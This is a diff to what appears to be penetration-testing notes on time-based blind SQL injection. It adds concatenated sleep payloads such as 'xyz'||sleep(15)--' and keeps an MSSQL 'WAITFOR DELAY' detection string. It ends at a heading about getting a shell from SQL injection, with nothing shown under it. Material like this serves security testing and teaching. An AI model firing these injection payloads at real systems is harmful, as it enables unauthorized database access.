@@ -174,15 +174,17 @@ Benchmark:
 ```
 Sometimes it will be needed to concatenate the strings to make it work. Try it if everything else fails:
 
-`|| sleep(15)--`
+`xyz'||sleep(15)--` or `xyz'%3bsleep(15)--`
 
 ##### Exploitation of time based BLIND SQLi
 
-1. Detect it time based sqli by using time delays:
+1. Detect time based sqli by using time delays:
 
 `'; IF (1=1) WAITFOR DELAY '0:0:10'--` shall cause a time delay
 
 If it doesn't work use payload cheat sheets mentioned above to identify correct datase type.
+
+2. 
 
 
 # Get shell from sql-injection
